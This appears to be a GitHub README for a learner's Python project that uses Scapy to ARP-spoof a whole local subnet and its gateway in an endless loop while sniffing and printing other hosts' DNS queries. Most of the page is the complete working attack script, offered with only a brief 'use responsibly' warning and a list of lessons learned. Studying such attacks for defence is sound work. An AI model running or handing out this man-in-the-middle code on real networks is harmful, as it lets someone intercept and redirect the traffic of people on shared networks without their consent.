# 🐍 Packet Sniffing & Spoofing Tool in Python
This script is a simplified network spoofing tool built with **Python 3**, using the `scapy`, `logging`, and `threading` libraries.  
It simulates behavior similar to **Bettercap**, allowing for **ARP spoofing** and **DNS sniffing** across a local network.
---
## 📚 What I Learned

- How to manipulate network packets using Scapy.
- ARP spoofing logic and redirection.
- DNS query interception and extraction.
- Multithreading to run ARP spoofing alongside DNS sniffing.
- Real-world applications of network attacks for defensive security awareness.

---

## ⚙️ How It Works

1. **ARP Spoofing**: Sends fake ARP replies to trick the target and gateway into sending packets to the attacker’s machine.
2. **DNS Sniffing**: Captures UDP DNS requests (port 53) and prints the source IP and requested domain.

---

## 🧠 Example Output
### 📸 Demo Screenshots
<img width="414" alt="Screenshot 2025-04-24 at 12 24 56 AM" src="https://github.com/user-attachments/assets/9ef96607-abcf-474e-b7b5-d7b9c05d6875" />

---

## 🧵 Requirements

Install the required library with:

```bash
pip install scapy


### 🚧 Warning:
Use responsibly and only in legal, lab environments.

<details> <summary>Click to expand the Python code</summary>

import logging
from scapy.all import ARP , send , sniff
from scapy.layers.dns import DNS , DNSQR , IP 
import threading
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

def arp_spoof(target_ip , spoof_ip):
    packet = ARP(op=2, pdst=target_ip , hwdst= "ff:ff:ff:ff:ff:ff" , psrc=spoof_ip)
    send(packet , verbose = False)
    
def dns_packet(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 :
        ip_src = packet [IP].src
        dns_query = packet[DNSQR].qname.decode()
        print (ip_src , dns_query)
    
def start_arp(target_ip, gateway_ip):
    while True:
        arp_spoof(target_ip, gateway_ip)
        arp_spoof (gateway_ip, target_ip)
    

target_ip = "192.168.1.0/24"
gateway_ip = "192.168.1.1"

threading.Thread(target=start_arp, args=(target_ip, gateway_ip)).start()

print ("[+] Network Trafffic : 2025 ")
print ("-"*40)
print (f"{'IP Address': <15} \t {'DNS Query' : <30}")
print ("-"*40)
sniff(filter="udp port 53" , prn=dns_packet, store=0)
</details>

👨‍💻 Author

Yanis Deriche — Cybersecurity & Network Security Enthusiast | Practical Labs + Projects | Open for Work

Connect with me on LinkedIn
Explore more of my work on GitHub
